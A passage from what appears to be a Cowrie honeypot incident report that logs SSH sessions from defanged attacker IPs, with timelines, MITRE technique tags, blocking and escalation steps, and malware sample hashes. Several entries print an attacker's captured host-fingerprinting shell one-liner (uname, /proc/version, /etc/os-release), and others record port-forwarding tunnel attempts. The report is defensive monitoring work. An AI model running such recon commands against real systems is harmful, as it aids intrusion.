| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.log.closed` |
| `2026-07-10 12:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32022fc06638

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:48 |
| **Last Seen** | 2026-07-10 12:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:48:27` | `cowrie.session.connect` |
| `2026-07-10 12:48:27` | `cowrie.client.version` |
| `2026-07-10 12:48:27` | `cowrie.client.kex` |
| `2026-07-10 12:48:28` | `cowrie.login.success` |
| `2026-07-10 12:48:29` | `cowrie.session.params` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.success` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.command.input` |
| `2026-07-10 12:48:29` | `cowrie.log.closed` |
| `2026-07-10 12:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc21e424267

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-07-10 12:48 |
| **Last Seen** | 2026-07-10 12:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:48:47` | `cowrie.session.connect` |
| `2026-07-10 12:48:48` | `cowrie.client.version` |
| `2026-07-10 12:48:48` | `cowrie.client.kex` |
| `2026-07-10 12:48:50` | `cowrie.login.success` |
| `2026-07-10 12:48:51` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f1c5ba12b84

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-07-10 12:48 |
| **Last Seen** | 2026-07-10 12:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:48:51` | `cowrie.session.connect` |
| `2026-07-10 12:48:52` | `cowrie.client.version` |
| `2026-07-10 12:48:52` | `cowrie.client.kex` |
| `2026-07-10 12:48:54` | `cowrie.login.success` |
| `2026-07-10 12:48:55` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bddee564c55

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-07-10 12:49 |
| **Last Seen** | 2026-07-10 12:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:49:00` | `cowrie.session.connect` |
| `2026-07-10 12:49:01` | `cowrie.client.version` |
| `2026-07-10 12:49:01` | `cowrie.client.kex` |
| `2026-07-10 12:49:03` | `cowrie.login.success` |
| `2026-07-10 12:49:04` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d57efd9581

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:49 |
| **Last Seen** | 2026-07-10 12:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:49:42` | `cowrie.session.connect` |
| `2026-07-10 12:49:42` | `cowrie.client.version` |
| `2026-07-10 12:49:42` | `cowrie.client.kex` |
| `2026-07-10 12:49:43` | `cowrie.login.success` |
| `2026-07-10 12:49:44` | `cowrie.session.params` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.success` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.command.input` |
| `2026-07-10 12:49:44` | `cowrie.log.closed` |
| `2026-07-10 12:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58b917267e9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 12:50 |
| **Last Seen** | 2026-07-10 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:50:16` | `cowrie.session.connect` |
| `2026-07-10 12:50:16` | `cowrie.client.version` |
| `2026-07-10 12:50:16` | `cowrie.client.kex` |
| `2026-07-10 12:50:16` | `cowrie.login.success` |
| `2026-07-10 12:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5c238c0121

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 12:50 |
| **Last Seen** | 2026-07-10 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:50:16` | `cowrie.session.connect` |
| `2026-07-10 12:50:16` | `cowrie.client.version` |
| `2026-07-10 12:50:16` | `cowrie.client.kex` |
| `2026-07-10 12:50:16` | `cowrie.login.success` |
| `2026-07-10 12:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a9898886537

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 12:50 |
| **Last Seen** | 2026-07-10 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:50:20` | `cowrie.session.connect` |
| `2026-07-10 12:50:20` | `cowrie.client.version` |
| `2026-07-10 12:50:20` | `cowrie.client.kex` |
| `2026-07-10 12:50:20` | `cowrie.login.success` |
| `2026-07-10 12:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b7ca639a7d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 12:50 |
| **Last Seen** | 2026-07-10 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:50:20` | `cowrie.session.connect` |
| `2026-07-10 12:50:20` | `cowrie.client.version` |
| `2026-07-10 12:50:20` | `cowrie.client.kex` |
| `2026-07-10 12:50:20` | `cowrie.login.success` |
| `2026-07-10 12:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f8235ead46

| Field | Detail |
|---|---|
| **Source IP** | `98.170.57[.]236` |
| **First Seen** | 2026-07-10 12:50 |
| **Last Seen** | 2026-07-10 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:50:23` | `cowrie.session.connect` |
| `2026-07-10 12:50:24` | `cowrie.client.version` |
| `2026-07-10 12:50:24` | `cowrie.client.kex` |
| `2026-07-10 12:50:30` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `98.170.57[.]236` to AbuseIPDB if not already reported
- [ ] Block `98.170.57[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bab746702fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:50 |
| **Last Seen** | 2026-07-10 12:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:50:56` | `cowrie.session.connect` |
| `2026-07-10 12:50:56` | `cowrie.client.version` |
| `2026-07-10 12:50:56` | `cowrie.client.kex` |
| `2026-07-10 12:50:57` | `cowrie.login.success` |
| `2026-07-10 12:50:58` | `cowrie.session.params` |
| `2026-07-10 12:50:58` | `cowrie.command.input` |
| `2026-07-10 12:50:58` | `cowrie.command.input` |
| `2026-07-10 12:50:58` | `cowrie.command.input` |
| `2026-07-10 12:50:59` | `cowrie.command.input` |
| `2026-07-10 12:50:59` | `cowrie.command.input` |
| `2026-07-10 12:50:59` | `cowrie.command.success` |
| `2026-07-10 12:50:59` | `cowrie.command.input` |
| `2026-07-10 12:50:59` | `cowrie.command.input` |
| `2026-07-10 12:50:59` | `cowrie.command.input` |
| `2026-07-10 12:50:59` | `cowrie.command.input` |
| `2026-07-10 12:50:59` | `cowrie.log.closed` |
| `2026-07-10 12:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b13afc183f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:52 |
| **Last Seen** | 2026-07-10 12:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:52:10` | `cowrie.session.connect` |
| `2026-07-10 12:52:10` | `cowrie.client.version` |
| `2026-07-10 12:52:10` | `cowrie.client.kex` |
| `2026-07-10 12:52:11` | `cowrie.login.success` |
| `2026-07-10 12:52:12` | `cowrie.session.params` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.success` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:12` | `cowrie.command.input` |
| `2026-07-10 12:52:13` | `cowrie.log.closed` |
| `2026-07-10 12:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89249eae9448

| Field | Detail |
|---|---|
| **Source IP** | `62.182.118[.]138` |
| **First Seen** | 2026-07-10 12:52 |
| **Last Seen** | 2026-07-10 12:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:52:11` | `cowrie.session.connect` |
| `2026-07-10 12:52:11` | `cowrie.client.version` |
| `2026-07-10 12:52:11` | `cowrie.client.kex` |
| `2026-07-10 12:52:13` | `cowrie.login.success` |
| `2026-07-10 12:52:13` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.118[.]138` to AbuseIPDB if not already reported
- [ ] Block `62.182.118[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-956a8f87d171

| Field | Detail |
|---|---|
| **Source IP** | `183.239.20[.]236` |
| **First Seen** | 2026-07-10 12:52 |
| **Last Seen** | 2026-07-10 12:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:52:19` | `cowrie.session.connect` |
| `2026-07-10 12:52:20` | `cowrie.client.version` |
| `2026-07-10 12:52:20` | `cowrie.client.kex` |
| `2026-07-10 12:52:24` | `cowrie.login.success` |
| `2026-07-10 12:52:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.239.20[.]236` to AbuseIPDB if not already reported
- [ ] Block `183.239.20[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712b0ea6bf25

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:53 |
| **Last Seen** | 2026-07-10 12:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:53:25` | `cowrie.session.connect` |
| `2026-07-10 12:53:25` | `cowrie.client.version` |
| `2026-07-10 12:53:25` | `cowrie.client.kex` |
| `2026-07-10 12:53:26` | `cowrie.login.success` |
| `2026-07-10 12:53:27` | `cowrie.session.params` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.success` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:27` | `cowrie.command.input` |
| `2026-07-10 12:53:28` | `cowrie.log.closed` |
| `2026-07-10 12:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45dd50fe5154

| Field | Detail |
|---|---|
| **Source IP** | `125.59.252[.]103` |
| **First Seen** | 2026-07-10 12:53 |
| **Last Seen** | 2026-07-10 12:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:53:59` | `cowrie.session.connect` |
| `2026-07-10 12:54:00` | `cowrie.client.version` |
| `2026-07-10 12:54:00` | `cowrie.client.kex` |
| `2026-07-10 12:54:02` | `cowrie.login.success` |
| `2026-07-10 12:54:03` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.59.252[.]103` to AbuseIPDB if not already reported
- [ ] Block `125.59.252[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-630b757a1a51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:54 |
| **Last Seen** | 2026-07-10 12:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:54:40` | `cowrie.session.connect` |
| `2026-07-10 12:54:40` | `cowrie.client.version` |
| `2026-07-10 12:54:40` | `cowrie.client.kex` |
| `2026-07-10 12:54:41` | `cowrie.login.success` |
| `2026-07-10 12:54:42` | `cowrie.session.params` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.success` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.command.input` |
| `2026-07-10 12:54:42` | `cowrie.log.closed` |
| `2026-07-10 12:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.150.146[.]69` | **92** | 2026-07-10 10:57 | 2026-07-10 12:54 | 52m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **44** | 2026-07-10 10:55 | 2026-07-10 12:48 | 53m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **21** | 2026-07-10 11:03 | 2026-07-10 12:54 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-07-10 11:16 | 2026-07-10 12:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]167` | **2** | 2026-07-10 12:48 | 2026-07-10 12:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `211.144.146[.]93` | **2** | 2026-07-10 11:02 | 2026-07-10 11:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.194.142[.]167` | 1 | 2026-07-10 11:43 | 2026-07-10 11:43 | 12s | 0 | `T1592` | 🟢 LOW |
| `116.48.143[.]166` | 1 | 2026-07-10 11:09 | 2026-07-10 11:09 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.61.64[.]135` | 1 | 2026-07-10 11:38 | 2026-07-10 11:39 | 31s | 0 | `T1592` | 🟢 LOW |
| `46.201.247[.]21` | 1 | 2026-07-10 11:06 | 2026-07-10 11:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.236.48[.]30` | 1 | 2026-07-10 12:52 | 2026-07-10 12:52 | 32s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-10 12:54 | 2026-07-10 12:54 | 5s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]86` | 1 | 2026-07-10 12:52 | 2026-07-10 12:52 | 16s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-10 12:45 | 2026-07-10 12:46 | 58s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
